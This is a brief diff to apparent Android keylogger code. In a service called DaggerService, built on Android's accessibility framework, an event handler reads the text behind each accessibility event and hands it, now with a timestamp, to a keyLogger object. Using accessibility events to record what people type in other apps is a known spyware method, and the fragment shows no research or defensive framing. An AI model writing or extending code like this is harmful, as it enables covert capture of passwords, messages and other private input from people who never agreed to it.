@@ -95,7 +95,7 @@ class DaggerService : AccessibilityService() {
                     val source = event.source
                     val keystroke = source?.text?.toString()
                     if (keystroke != null) {
-                        keyLogger.recordKeystroke(event)
+                        keyLogger.recordKeystroke(keystroke, event.eventTime)
                     }
                 }
             }
